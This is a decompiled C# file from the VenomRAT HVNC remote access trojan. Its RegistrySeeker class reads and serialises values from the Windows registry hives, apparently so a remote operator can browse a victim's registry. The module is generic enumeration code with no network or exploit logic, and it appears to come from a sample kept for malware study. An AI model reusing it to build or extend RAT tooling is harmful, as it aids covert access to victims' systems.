// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Helper.RegistrySeeker
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using Microsoft.Win32;
using ProtoBuf;
using System;
using System.Collections.Generic;

namespace VenomRAT_HVNC.Server.Helper
{
  public class RegistrySeeker
  {
    private readonly List<RegistrySeeker.RegSeekerMatch> _matches;

    public RegistrySeeker.RegSeekerMatch[] Matches => this._matches?.ToArray();

    public RegistrySeeker() => this._matches = new List<RegistrySeeker.RegSeekerMatch>();

    public void BeginSeeking(string rootKeyName)
    {
      if (!string.IsNullOrEmpty(rootKeyName))
      {
        using (RegistryKey rootKey1 = RegistrySeeker.GetRootKey(rootKeyName))
        {
          if (rootKey1 != null && rootKey1.Name != rootKeyName)
          {
            string name = rootKeyName.Substring(rootKey1.Name.Length + 1);
            using (RegistryKey rootKey2 = rootKey1.OpenReadonlySubKeySafe(name))
            {
              if (rootKey2 == null)
                return;
              this.Seek(rootKey2);
            }
          }
          else
            this.Seek(rootKey1);
        }
      }
      else
        this.Seek((RegistryKey) null);
    }

    private void Seek(RegistryKey rootKey)
    {
      if (rootKey == null)
      {
        foreach (RegistryKey rootKey1 in RegistrySeeker.GetRootKeys())
          this.ProcessKey(rootKey1, rootKey1.Name);
      }
      else
        this.Search(rootKey);
    }

    private void Search(RegistryKey rootKey)
    {
      foreach (string subKeyName in rootKey.GetSubKeyNames())
        this.ProcessKey(rootKey.OpenReadonlySubKeySafe(subKeyName), subKeyName);
    }

    private void ProcessKey(RegistryKey key, string keyName)
    {
      if (key != null)
      {
        List<RegistrySeeker.RegValueData> values = new List<RegistrySeeker.RegValueData>();
        foreach (string valueName in key.GetValueNames())
        {
          RegistryValueKind valueKind = key.GetValueKind(valueName);
          object obj = key.GetValue(valueName);
          values.Add(RegistryKeyHelper.CreateRegValueData(valueName, valueKind, obj));
        }
        this.AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
      }
      else
        this.AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
    }

    private void AddMatch(string key, RegistrySeeker.RegValueData[] values, int subkeycount) => this._matches.Add(new RegistrySeeker.RegSeekerMatch()
    {
      Key = key,
      Data = values,
      HasSubKeys = subkeycount > 0
    });

    public static RegistryKey GetRootKey(string subkeyFullPath)
    {
      string[] strArray = subkeyFullPath.Split('\\');
      RegistryKey rootKey;
      try
      {
        string str = strArray[0];
        if (!(str == "HKEY_CLASSES_ROOT"))
        {
          if (!(str == "HKEY_CURRENT_USER"))
          {
            if (!(str == "HKEY_LOCAL_MACHINE"))
            {
              if (!(str == "HKEY_USERS"))
              {
                if (!(str == "HKEY_CURRENT_CONFIG"))
                  throw new Exception("Invalid rootkey, could not be found.");
                rootKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64);
              }
              else
                rootKey = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64);
            }
            else
              rootKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
          }
          else
            rootKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
        }
        else
          rootKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64);
      }
      catch (SystemException ex)
      {
        throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
      }
      catch (Exception ex)
      {
        throw ex;
      }
      return rootKey;
    }

    public static List<RegistryKey> GetRootKeys()
    {
      List<RegistryKey> rootKeys = new List<RegistryKey>();
      try
      {
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
      }
      catch (SystemException ex)
      {
        throw new Exception("Could not open root registry keys, you may not have the needed permission");
      }
      catch (Exception ex)
      {
        throw ex;
      }
      return rootKeys;
    }

    [ProtoContract]
    public class RegSeekerMatch
    {
      [ProtoMember(1)]
      public string Key { get; set; }

      [ProtoMember(2)]
      public RegistrySeeker.RegValueData[] Data { get; set; }

      [ProtoMember(3)]
      public bool HasSubKeys { get; set; }

      public override string ToString() => string.Format("({0}:{1})", (object) this.Key, (object) this.Data);
    }

    [ProtoContract]
    public class RegValueData
    {
      [ProtoMember(1)]
      public string Name { get; set; }

      [ProtoMember(2)]
      public RegistryValueKind Kind { get; set; }

      [ProtoMember(3)]
      public byte[] Data { get; set; }
    }
  }
}
